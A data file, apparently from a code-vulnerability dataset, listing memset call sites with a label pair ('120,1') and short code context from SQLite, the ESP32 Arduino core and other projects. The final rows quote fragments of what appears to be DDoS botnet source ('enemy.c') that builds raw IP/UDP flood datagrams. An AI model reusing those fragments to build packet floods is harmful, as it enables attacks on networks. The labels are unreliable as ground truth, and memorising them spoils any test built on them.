2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&a[pParse->nzVar], 0, (x-pParse->nzVar)*sizeof(a[0]));",120,1,"        }
        pParse->azVar = a;
        memset(&a[pParse->nzVar], 0, (x-pParse->nzVar)*sizeof(a[0]));
        pParse->nzVar = x;
      }
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&zAlloc[nSize], 0, sizeof(Expr)-nSize);",120,1,"{

          memset(&zAlloc[nSize], 0, sizeof(Expr)-nSize);
        }
      }
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pItem, 0, sizeof(*pItem));",120,1,"
    struct ExprList_item *pItem = &pList->a[pList->nExpr++];
    memset(pItem, 0, sizeof(*pItem));
    pItem->pExpr = pExpr;
  }
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(aNew, 0, sizeof(*aNew));",120,1,"  db->aDb = aNew;
  aNew = &db->aDb[db->nDb];
  memset(aNew, 0, sizeof(*aNew));


"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&sName, 0, sizeof(NameContext));",120,1,"  int regArgs;

  memset(&sName, 0, sizeof(NameContext));
  sName.pParse = pParse;

"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&pParse->nVar, 0, (sizeof(Parse) - __builtin_offsetof (Parse, nVar)));",120,1,"  pParse->nested++;
  memcpy(saveBuf, &pParse->nVar, (sizeof(Parse) - __builtin_offsetof (Parse, nVar)));
  memset(&pParse->nVar, 0, (sizeof(Parse) - __builtin_offsetof (Parse, nVar)));
  sqlite3RunParser(pParse, zSql, &zErrMsg);
  sqlite3DbFree(db, zErrMsg);
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pCol, 0, sizeof(p->aCol[0]));",120,1,"  }
  pCol = &p->aCol[p->nCol];
  memset(pCol, 0, sizeof(p->aCol[0]));
  pCol->zName = z;
  ;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&x, 0, sizeof(x));",120,1,"      Expr x;
      sqlite3ExprDelete(db, pCol->pDflt);
      memset(&x, 0, sizeof(x));
      x.op = 159;
      x.u.zToken = sqlite3DbStrNDup(db, (char*)pSpan->zStart,
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&z[n * szEntry], 0, szEntry);",120,1,"  }
  z = (char*)pArray;
  memset(&z[n * szEntry], 0, szEntry);
  *pIdx = n;
  ++*pnEntry;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&pSrc->a[iStart], 0, sizeof(pSrc->a[0])*nExtra);",120,1,"

  memset(&pSrc->a[iStart], 0, sizeof(pSrc->a[0])*nExtra);
  for(i=iStart; i<iStart+nExtra; i++)
{
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(aToOpen, 1, nIdx+1);",120,1,"        goto delete_from_cleanup;
      }
      memset(aToOpen, 1, nIdx+1);
      aToOpen[nIdx+1] = 0;
      if( aiCurOnePass[0]>=0 ) aToOpen[aiCurOnePass[0]-iTabCur] = 0;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&sNameContext, 0, sizeof(NameContext));",120,1,"

  memset(&sNameContext, 0, sizeof(NameContext));
  sNameContext.pSrcList = pSrc;
  sNameContext.pParse = pParse;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&dest, 0, sizeof(dest));",120,1,"
  db = pParse->db;
  memset(&dest, 0, sizeof(dest));
  if( pParse->nErr || db->mallocFailed )
{
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pKI->aSortOrder, 0, pKI->nField);",120,1,"    pOp->p2 = nKey + nData;
    pKI = pOp->p4.pKeyInfo;
    memset(pKI->aSortOrder, 0, pKI->nField);
    sqlite3VdbeChangeP4(v, -1, (char*)pKI, (-6));
    ;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&p[1], 0, nExtra);",120,1,"    p->db = db;
    p->nRef = 1;
    memset(&p[1], 0, nExtra);
  }else{
    sqlite3OomFault(db);
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&pSubSrc->a[i], 0, sizeof(pSubSrc->a[i]));",120,1,"      ((void) (0));
      pSrc->a[i+iFrom] = pSubSrc->a[i];
      memset(&pSubSrc->a[i], 0, sizeof(pSubSrc->a[i]));
    }
    pSrc->a[iFrom].fg.jointype = jointype;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&dummy, 0, sizeof(dummy));",120,1,"  pNew = sqlite3DbMallocZero(db, sizeof(*pNew) );
  if( pNew==0 ) return 2;
  memset(&dummy, 0, sizeof(dummy));
  pNewSrc = sqlite3SrcListAppendFromTerm(pParse,0,0,0,&dummy,pNew,0,0);
  if( pNewSrc==0 ) return 2;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&sAggInfo, 0, sizeof(sAggInfo));",120,1,"  }
  if( sqlite3AuthCheck(pParse, 21, 0, 0, 0) ) return 1;
  memset(&sAggInfo, 0, sizeof(sAggInfo));
# 115320 ""sqlite3.c""
  ((void) (0));
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&sSort, 0, sizeof(sSort));",120,1,"  }
  sqlite3SelectPrep(pParse, p, 0);
  memset(&sSort, 0, sizeof(sSort));
  sSort.pOrderBy = p->pOrderBy;
  pTabList = p->pSrc;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pVTable->pVtab, 0, sizeof(pVTable->pVtab[0]));",120,1,"

    memset(pVTable->pVtab, 0, sizeof(pVTable->pVtab[0]));
    pVTable->pVtab->pModule = pMod->pModule;
    pVTable->nRef = 1;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&aVTrans[db->nVTrans], 0, sizeof(sqlite3_vtab *)*ARRAY_INCR);",120,1,"      return 7;
    }
    memset(&aVTrans[db->nVTrans], 0, sizeof(sqlite3_vtab *)*ARRAY_INCR);
    db->aVTrans = aVTrans;
  }
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&pWC->a[pWC->nTerm], 0, sizeof(pWC->a[0])*(pWC->nSlot-pWC->nTerm));",120,1,"    }
    pWC->nSlot = sqlite3DbMallocSize(db, pWC->a)/sizeof(pWC->a[0]);
    memset(&pWC->a[pWC->nTerm], 0, sizeof(pWC->a[0])*(pWC->nSlot-pWC->nTerm));
  }
  pTerm = &pWC->a[idx = pWC->nTerm++];
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pOrWc->aStatic, 0, sizeof(pOrWc->aStatic));",120,1,"  pTerm->wtFlags |= 0x10;
  pOrWc = &pOrInfo->wc;
  memset(pOrWc->aStatic, 0, sizeof(pOrWc->aStatic));
  sqlite3WhereClauseInit(pOrWc, pWInfo);
  sqlite3WhereSplit(pOrWc, pExpr, 71);
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pAndWC->aStatic, 0, sizeof(pAndWC->aStatic));",120,1,"        pOrTerm->eOperator = 0x0400;
        pAndWC = &pAndInfo->wc;
        memset(pAndWC->aStatic, 0, sizeof(pAndWC->aStatic));
        sqlite3WhereClauseInit(pAndWC, pWC->pWInfo);
        sqlite3WhereSplit(pAndWC, pOrTerm->pExpr, 72);
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&pTo->u, 0, sizeof(pTo->u));",120,1,"{

    memset(&pTo->u, 0, sizeof(pTo->u));
    return 7;
  }
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&sPk, 0, sizeof(Index));",120,1,"
    Index *pFirst;
    memset(&sPk, 0, sizeof(Index));
    sPk.nKeyCol = 1;
    sPk.nColumn = 1;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(pUsage, 0, sizeof(pUsage[0])*nConstraint);",120,1,"

  memset(pUsage, 0, sizeof(pUsage[0])*nConstraint);
  ((void) (0));
  pIdxInfo->idxStr = 0;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&sSum, 0, sizeof(sSum));",120,1,"  pWCEnd = pWC->a + pWC->nTerm;
  pNew = pBuilder->pNew;
  memset(&sSum, 0, sizeof(sSum));
  pItem = pWInfo->pTabList->a + pNew->iTab;
  iCur = pItem->iCursor;
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&pNew->u, 0, sizeof(pNew->u));",120,1,"      pNew->rSetup = 0;
      pNew->iSortIdx = 0;
      memset(&pNew->u, 0, sizeof(pNew->u));
      for(i=0; rc==0 && i<sSum.n; i++)
{
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(aFrom, 0, sizeof(aFrom[0]));",120,1,"  aTo = (WherePath*)pSpace;
  aFrom = aTo+mxChoice;
  memset(aFrom, 0, sizeof(aFrom[0]));
  pX = (WhereLoop**)(aFrom+mxChoice);
  for(ii=mxChoice*2, pFrom=aTo; ii>0; ii--, pFrom++, pX += nLoop)
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(aSortCost, 0, sizeof(LogEst) * nOrderBy);",120,1,"
    aSortCost = (LogEst*)pX;
    memset(aSortCost, 0, sizeof(LogEst) * nOrderBy);
  }
  ((void) (0));
"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&sWLB, 0, sizeof(sWLB));",120,1,"
  db = pParse->db;
  memset(&sWLB, 0, sizeof(sWLB));


"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"memset(&sqlite3BuiltinFunctions, 0, sizeof(sqlite3BuiltinFunctions));",120,1,"

    memset(&sqlite3BuiltinFunctions, 0, sizeof(sqlite3BuiltinFunctions));
    sqlite3RegisterBuiltinFunctions();
    if( sqlite3Config.isPCacheInit==0 )
"
2021\deneyapkart-arduino-core\cores\esp32\cbuf.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\cbuf.cpp,"memset((newbuf + bytes_available), 0x00, (newSize - bytes_available));",120,1,"    if(_buf) {
        read(newbuf, bytes_available);
        memset((newbuf + bytes_available), 0x00, (newSize - bytes_available));
    }

"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"memset(buff,' ',140);",120,1,"        uint16_t offset = 0;
        while(offset<tdq->length) {
            memset(buff,' ',140);
            buff[139]='\0';
            uint16_t i = 0,j;
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"memset(fifoBuffer,0,FIFOMAX);",120,1,"    intPos[i2c->num] = 0;
    fifoPos = 0;
    memset(fifoBuffer,0,FIFOMAX);
#endif
    // EventGroup is used to signal transmission completion from ISR
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-spi.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-spi.c,"memset(bytesBuf, 0xFF, bytes);",120,1,"        memcpy(bytesBuf, data, bytes);//copy data to buffer
    } else {
        memset(bytesBuf, 0xFF, bytes);
    }

"
2021\deneyapkart-arduino-core\cores\esp32\IPv6Address.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\IPv6Address.cpp,"memset(_address.bytes, 0, sizeof(_address.bytes));",120,1,"IPv6Address::IPv6Address()
{
    memset(_address.bytes, 0, sizeof(_address.bytes));
}

"
2021\deneyapkart-arduino-core\cores\esp32\MD5Builder.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\MD5Builder.cpp,"memset(_buf, 0x00, 16);",120,1,"void MD5Builder::begin(void)
{
    memset(_buf, 0x00, 16);
    MD5Init(&_ctx);
}
"
2021\deneyapkart-arduino-core\cores\esp32\WString.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\WString.cpp,"memset(newbuffer + oldSize, 0, newSize - oldSize);",120,1,"        if (newSize > oldSize)
        {
            memset(newbuffer + oldSize, 0, newSize - oldSize);
        }
        setSSO(false);
"
2021\deneyapkart-arduino-core\libraries\00_LIBS\src\Adafruit_MQTT.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_LIBS\src\Adafruit_MQTT.cpp,"memset(subscriptions[i]->lastread, 0, SUBSCRIPTIONDATALEN);",120,1,"
  // zero out the old data
  memset(subscriptions[i]->lastread, 0, SUBSCRIPTIONDATALEN);

  datalen = len - topiclen - packet_id_len - 4;
"
2021\deneyapkart-arduino-core\libraries\00_LIBS\src\Adafruit_MQTT_Client.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_LIBS\src\Adafruit_MQTT_Client.cpp,"memset(buffer, 0, sizeof(buffer));",120,1,"bool Adafruit_MQTT_Client::connectServer() {
  // Grab server name from flash and copy to buffer for name resolution.
  memset(buffer, 0, sizeof(buffer));
  strcpy((char *)buffer, servername);
  DEBUG_PRINT(F(""Connecting to: ""));
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"memset(filter, 0, sizeof(ra_filter_t));",120,1,"
static ra_filter_t * ra_filter_init(ra_filter_t * filter, size_t sample_size){
    memset(filter, 0, sizeof(ra_filter_t));

    filter->values = (int *)malloc(sample_size * sizeof(int));
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"memset(filter->values, 0, sample_size * sizeof(int));",120,1,"        return NULL;
    }
    memset(filter->values, 0, sample_size * sizeof(int));

    filter->size = sample_size;
"
2021\deneyapkart-arduino-core\libraries\07_BLE\src\BLEBeacon.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\07_BLE\src\BLEBeacon.cpp,"memset(m_beaconData.proximityUUID, 0, sizeof(m_beaconData.proximityUUID));",120,1,"	m_beaconData.minor          = 0;
	m_beaconData.signalPower    = 0;
	memset(m_beaconData.proximityUUID, 0, sizeof(m_beaconData.proximityUUID));
} // BLEBeacon

"
2021\deneyapkart-arduino-core\libraries\07_BLE\src\BLEEddystoneURL.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\07_BLE\src\BLEEddystoneURL.cpp,"memset(m_eddystoneData.url, 0, sizeof(m_eddystoneData.url));",120,1,"	m_eddystoneData.frameType = EDDYSTONE_URL_FRAME_TYPE;
	m_eddystoneData.advertisedTxPower = 0;
	memset(m_eddystoneData.url, 0, sizeof(m_eddystoneData.url));
} // BLEEddystoneURL

"
2021\deneyapkart-arduino-core\libraries\07_BLE\src\BLEEddystoneURL.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\07_BLE\src\BLEEddystoneURL.cpp,"memset(&m_eddystoneData, 0, sizeof(m_eddystoneData));",120,1,"		return;
	}
	memset(&m_eddystoneData, 0, sizeof(m_eddystoneData));
	memcpy(&m_eddystoneData, data.data(), data.length());
	lengthURL = data.length() - (sizeof(m_eddystoneData) - sizeof(m_eddystoneData.url));
"
2021\deneyapkart-arduino-core\libraries\07_BLE\src\BLEScan.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\07_BLE\src\BLEScan.cpp,"memset(&m_scan_params, 0, sizeof(m_scan_params));",120,1," */
BLEScan::BLEScan() {
	memset(&m_scan_params, 0, sizeof(m_scan_params)); // Initialize all params
	m_scan_params.scan_type          = BLE_SCAN_TYPE_PASSIVE; // Default is a passive scan.
	m_scan_params.own_addr_type      = BLE_ADDR_TYPE_PUBLIC;
"
2021\deneyapkart-arduino-core\libraries\07_BLE\src\BluetoothSerial.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\07_BLE\src\BluetoothSerial.cpp,"memset(pin_code, '0', ESP_BT_PIN_CODE_LEN);",120,1,"                log_i(""Input pin code: 0000 0000 0000 0000"");
                esp_bt_pin_code_t pin_code;
                memset(pin_code, '0', ESP_BT_PIN_CODE_LEN);
                esp_bt_gap_pin_reply(param->pin_req.bda, true, 16, pin_code);
            } else {
"
2021\deneyapkart-arduino-core\libraries\08_WiFi\src\WiFiSTA.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\08_WiFi\src\WiFiSTA.cpp,"memset(&conf, 0, sizeof(wifi_config_t));",120,1,"
    wifi_config_t conf;
    memset(&conf, 0, sizeof(wifi_config_t));
    strcpy(reinterpret_cast<char*>(conf.sta.ssid), ssid);

"
2021\deneyapkart-arduino-core\libraries\08_WiFi\src\WiFiUdp.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\08_WiFi\src\WiFiUdp.cpp,"memset((char *) &addr, 0, sizeof(addr));",120,1,"
  struct sockaddr_in addr;
  memset((char *) &addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(server_port);
"
2021\deneyapkart-arduino-core\tools\sdk\include\coap\address.h,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\tools\sdk\include\coap\address.h,"memset(addr, 0, sizeof(coap_address_t));",120,1,"coap_address_init(coap_address_t *addr) {
  assert(addr);
  memset(addr, 0, sizeof(coap_address_t));
#ifdef WITH_POSIX
  /* lwip and Contiki have constant address sizes and doesn't need the .size part */
"
2021\deneyapkart-arduino-core\tools\sdk\include\coap\hashkey.h,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\tools\sdk\include\coap\hashkey.h,"memset((H), 0, sizeof(coap_key_t));      \",120,1,"#define coap_str_hash(Str,H) {               \
    assert(Str);                             \
    memset((H), 0, sizeof(coap_key_t));      \
    coap_hash((Str)->s, (Str)->length, (H)); \
  }
"
2021\deneyapkart-arduino-core\tools\sdk\include\coap\option.h,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\tools\sdk\include\coap\option.h,"memset(f, 0, sizeof(coap_opt_filter_t));",120,1,"static inline void
coap_option_filter_clear(coap_opt_filter_t f) {
  memset(f, 0, sizeof(coap_opt_filter_t));
}

"
2021\deneyapkart-arduino-core\tools\sdk\include\coap\uthash.h,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\tools\sdk\include\coap\uthash.h,"memset((tbl)->bloom_bv, 0, HASH_BLOOM_BYTELEN);                                \",120,1,"  (tbl)->bloom_bv = (uint8_t*)uthash_malloc(HASH_BLOOM_BYTELEN);                 \
  if (!((tbl)->bloom_bv))  { uthash_fatal( ""out of memory""); }                   \
  memset((tbl)->bloom_bv, 0, HASH_BLOOM_BYTELEN);                                \
  (tbl)->bloom_sig = HASH_BLOOM_SIGNATURE;                                       \
} while (0)
"
2021\deneyapkart-arduino-core\tools\sdk\include\coap\uthash.h,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\tools\sdk\include\coap\uthash.h,"memset((head)->hh.tbl, 0, sizeof(UT_hash_table));                              \",120,1,"                  sizeof(UT_hash_table));                                        \
  if (!((head)->hh.tbl))  { uthash_fatal( ""out of memory""); }                    \
  memset((head)->hh.tbl, 0, sizeof(UT_hash_table));                              \
  (head)->hh.tbl->tail = &((head)->hh);                                          \
  (head)->hh.tbl->num_buckets = HASH_INITIAL_NUM_BUCKETS;                        \
"
2021\deneyapkart-arduino-core\tools\sdk\include\json\tests\common.h,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\tools\sdk\include\json\tests\common.h,"memset(item, 0, sizeof(cJSON));",120,1,"    }

    memset(item, 0, sizeof(cJSON));
}

"
2021\deneyapkart-arduino-core\tools\sdk\include\lwip\lwip\sockets.h,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\tools\sdk\include\lwip\lwip\sockets.h,"#define FD_ZERO(p)    memset((void*)(p), 0, sizeof(*(p)))",120,1,"#define FD_CLR(n, p)  FDSETSAFESET(n, (p)->fd_bits[((n)-LWIP_SOCKET_OFFSET)/8] &= ~(1 << (((n)-LWIP_SOCKET_OFFSET) & 7)))
#define FD_ISSET(n,p) FDSETSAFEGET(n, (p)->fd_bits[((n)-LWIP_SOCKET_OFFSET)/8] &   (1 << (((n)-LWIP_SOCKET_OFFSET) & 7)))
#define FD_ZERO(p)    memset((void*)(p), 0, sizeof(*(p)))

typedef struct fd_set
"
2021\deneyapkart-arduino-core\tools\sdk\include\lwip\netif\ppp\ppp_impl.h,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\tools\sdk\include\lwip\netif\ppp\ppp_impl.h,"#define BZERO(s, n)		memset(s, 0, n)",120,1,"#define UNTIMEOUT(f, a)         sys_untimeout((f), (a))

#define BZERO(s, n)		memset(s, 0, n)
#define	BCMP(s1, s2, l)		memcmp(s1, s2, l)

"
2021\deneyapkart-arduino-core\tools\sdk\include\newlib\sys\reent.h,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\tools\sdk\include\newlib\sys\reent.h,"{ memset((var), 0, sizeof(*(var))); \",120,1,"#ifndef ESP_PLATFORM
#define _REENT_INIT_PTR(var) \
  { memset((var), 0, sizeof(*(var))); \
    (var)->_stdin = (__FILE *)&__sf_fake_stdin; \
    (var)->_stdout = (__FILE *)&__sf_fake_stdout; \
"
2021\deneyapkart-arduino-core\tools\sdk\include\newlib\sys\reent.h,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\tools\sdk\include\newlib\sys\reent.h,"memset((var)->_asctime_buf, 0, _REENT_ASCTIME_SIZE))",120,1,"#define _REENT_CHECK_ASCTIME_BUF(var) \
  _REENT_CHECK(var, _asctime_buf, char *, _REENT_ASCTIME_SIZE, \
    memset((var)->_asctime_buf, 0, _REENT_ASCTIME_SIZE))

/* Handle the dynamically allocated rand48 structure. */
"
2021\deneyapkart-arduino-core\tools\sdk\include\tcpip_adapter\tcpip_adapter.h,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\tools\sdk\include\tcpip_adapter\tcpip_adapter.h,"memset(&msg, 0, sizeof(msg));\",120,1,"        abort();\
    }\
    memset(&msg, 0, sizeof(msg));\
    msg.tcpip_if = (_if);\
    msg.mac      = (uint8_t*)(_mac);\
"
2021\deneyapkart-arduino-core\tools\sdk\include\wpa_supplicant\os.h,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\tools\sdk\include\wpa_supplicant\os.h,"#define os_memset(s, c, n) memset(s, c, n)",120,1,"#endif
#ifndef os_memset
#define os_memset(s, c, n) memset(s, c, n)
#endif
#ifndef os_memcmp
"
2021\deneyapkart-arduino-core\tools\sdk\include\wpa_supplicant\wpa2\eap_peer\eap_ttls.h,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\tools\sdk\include\wpa_supplicant\wpa2\eap_peer\eap_ttls.h,"os_memset((pos), 0, __pad); \",120,1,"	int __pad; \
	__pad = (4 - (((pos) - (start)) & 3)) & 3; \
	os_memset((pos), 0, __pad); \
	pos += __pad; \
} while (0)
"
2021\embed-iot-core\lib\EEPROM\src\EEPROM.cpp,Dataset Download,../../Dataset Download/2021\embed-iot-core\lib\EEPROM\src\EEPROM.cpp,"memset(key_data, 0xFF, size);",120,1,"         return false;
      }
      memset(key_data, 0xFF, size);
      if(key_size) {
        log_i(""Expanding EEPROM from %d to %d"", key_size, size);
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(decoded, 0, sizeof(decoded));",120,1,"	int x = 0, i = 0, c;

	memset(decoded, 0, sizeof(decoded));
	while(x < strlen(str))
	{
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(textBuffer, 0, 2048);",120,1,"int sockprintf(int sock, char * formatStr, ...) {
  unsigned char * textBuffer = malloc(2048);
  memset(textBuffer, 0, 2048);
  char * orig = textBuffer;
  va_list args;
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);",120,1,"dest_addr.sin_port = HTONS(port);
if(getHost(host, &dest_addr.sin_addr)) return 0;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(buf, 0, bufsize);",120,1,"int recvLine(unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);
        fd_set myset;
        fd_set errors;
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(buf, 0, packetsize + 1);",120,1,"    unsigned char * buf = (unsigned char * ) malloc(packetsize + 1);
    if (buf == NULL) return;
    memset(buf, 0, packetsize + 1);
    RandString(buf, packetsize);

"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(&(serve3r.sin_zero), 0, 8);",120,1,"        memcpy((char *)&serve3r.sin_addr, hostm->h_addr, hostm->h_length);
    } else serve3r.sin_addr.s_addr = ipaddr;
    memset(&(serve3r.sin_zero), 0, 8);
    if (connect(sock2, (struct sockaddr * )&serve3r, sizeof(serve3r)) != 0) {
        return 1;
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(datagram, 0, 65535);",120,1,"                _exit(-1);
        }
        memset(datagram, 0, 65535);
        setup_ip_header(iph);
        setup_udp_header(udph);
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(fds, 0, max * (sizeof(int) + 1));",120,1,"    }
    fds[max];
    memset(fds, 0, max * (sizeof(int) + 1));

    fd_set myset;
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(pakt, 0, 1024);",120,1,"
    unsigned char * pakt = malloc(1024);
    memset(pakt, 0, 1024);
    int packetLen = 1024;

"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(&hints, 0, sizeof hints);",120,1,"    if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) _exit(1);

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    if ((gai_err = getaddrinfo(host, NULL,&hints,&ai)) != 0) {
"
